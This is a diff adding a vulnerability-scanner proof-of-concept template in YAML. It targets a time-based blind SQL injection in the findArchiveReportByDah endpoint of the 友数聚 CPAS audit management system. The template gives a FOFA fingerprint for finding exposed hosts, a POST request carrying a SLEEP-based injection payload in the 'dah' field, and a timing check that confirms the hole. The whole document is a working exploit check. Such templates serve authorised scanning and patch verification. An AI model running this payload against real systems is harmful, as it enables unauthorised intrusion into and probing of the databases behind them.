@@ -1,0 +1,22 @@
+id: poc-yaml-youdatasum-cpas-findarchivereportbydah-sqli
+info:
+  name: 友数聚 CPAS审计管理系统 findArchiveReportByDah SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: CPAS审计管理系统
+  fofa: body="/cpasm4/static/cap/font/iconfont.css"
+variables:
+  t1: random_int(1,4)
+  t2: t1 * 3
+  t3: t2 + 2
+requests:
+- method: POST
+  path: /cpasm4/cpasList/findArchiveReportByDah
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: dah=1' AND (SELECT * FROM (SELECT(SLEEP({{.t1}})))x) AND '1'='1
+  expression: status_code == 200 && contains(body,"\"total\" :") && contains(body,"\"rows\"
+    :") && contains(content_type,"application/json") && !contains(body,"<") && duration
+    > t2 && duration < t3
+transport: http
